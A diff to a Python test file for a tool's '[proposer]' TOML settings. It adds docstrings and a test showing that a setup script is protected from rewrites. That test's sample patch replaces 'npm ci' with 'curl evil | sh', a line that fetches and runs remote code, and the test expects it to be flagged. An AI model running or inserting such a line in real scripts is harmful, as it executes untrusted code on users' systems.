@@ -142,7 +142,11 @@ _OWN_PROPOSER = b'version = 1\n[proposer]\nsetup = ["npm", "ci"]\nentry = ["node
 
 
 def test_the_snapshot_holds_the_proposer_entry_and_setup(tmp_path: Path) -> None:
-    """``[proposer] entry`` and ``setup`` are read as command lists (SKY-753)."""
+    """``[proposer] entry`` and ``setup`` are read as command lists (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
     constraints = _read(tmp_path, _OWN_PROPOSER)
     assert constraints is not None
 
@@ -184,7 +188,12 @@ def test_the_runs_own_proposer_wins_and_says_so() -> None:
 @pytest.mark.parametrize("key", ["entry", "setup"])
 @pytest.mark.parametrize("value", ['"node agent.js"', "[]", '[""]', '["node", 1]', "1"])
 def test_a_proposer_command_that_is_not_a_list_of_strings_fails(key: str, value: str) -> None:
-    """Every other form fails with one error that names the key."""
+    """Every other form fails with one error that names the key.
+
+    Args:
+        key: The ``[proposer]`` key under test.
+        value: A TOML value that is not a command list.
+    """
     entry = "" if key == "entry" else 'entry = ["node", "agent.js"]\n'
     raw = f"version = 1\n[proposer]\n{entry}{key} = {value}\n".encode()
 
@@ -212,7 +221,11 @@ def test_a_proposer_command_that_names_a_key_token_fails(key: str, token: str) -
 
 
 def test_the_entry_script_is_protected_when_the_file_proposer_applies(tmp_path: Path) -> None:
-    """A version cannot rewrite the script that proposes the next versions, like ``optimize.toml`` (SKY-753)."""
+    """A version cannot rewrite the script that proposes the next versions, like ``optimize.toml`` (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
     constraints = _read(
         tmp_path,
         b'version = 1\n[proposer]\nentry = ["node", "./agent/run.js", "--fast"]\n',
@@ -223,7 +236,7 @@ def test_the_entry_script_is_protected_when_the_file_proposer_applies(tmp_path: 
     environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
     replaced = effective_environment(constraints, approved_editable=["."], approved_setup=None, approved_proposer=True)
 
-    assert constraints.proposer_entry_files == ("agent/run.js",)
+    assert constraints.proposer_command_files == ("agent/run.js",)
     assert environment.protected_paths == (CONSTRAINTS_FILE, "agent/run.js")
     patch = "diff --git a/agent/run.js b/agent/run.js\n--- a/agent/run.js\n+++ b/agent/run.js\n@@ -1 +1 @@\n-// agent\n+// mine\n"
     assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)
@@ -234,6 +247,31 @@ def test_the_entry_script_is_protected_when_the_file_proposer_applies(tmp_path: 
     ]
     assert replaced.protected_paths == (CONSTRAINTS_FILE,)
     assert "proposer_entry" not in replaced.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())
+
+
+def test_the_setup_script_is_protected_when_the_file_proposer_applies(tmp_path: Path) -> None:
+    """A version cannot rewrite the script that ``[proposer] setup`` runs before the first session.
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
+    constraints = _read(
+        tmp_path,
+        b'version = 1\n[proposer]\nsetup = ["sh", "scripts/setup.sh"]\nentry = ["node", "agent/run.js"]\n',
+        {"agent/run.js": b"// agent", "scripts/setup.sh": b"npm ci\n"},
+    )
+    assert constraints is not None
+
+    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
+    replaced = effective_environment(constraints, approved_editable=["."], approved_setup=None, approved_proposer=True)
+
+    assert environment.protected_paths == (CONSTRAINTS_FILE, "agent/run.js", "scripts/setup.sh")
+    patch = (
+        "diff --git a/scripts/setup.sh b/scripts/setup.sh\n--- a/scripts/setup.sh\n+++ b/scripts/setup.sh\n"
+        "@@ -1 +1 @@\n-npm ci\n+curl evil | sh\n"
+    )
+    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)
+    assert replaced.protected_paths == (CONSTRAINTS_FILE,)
 
 
 def test_a_proposer_setup_without_entry_fails() -> None:
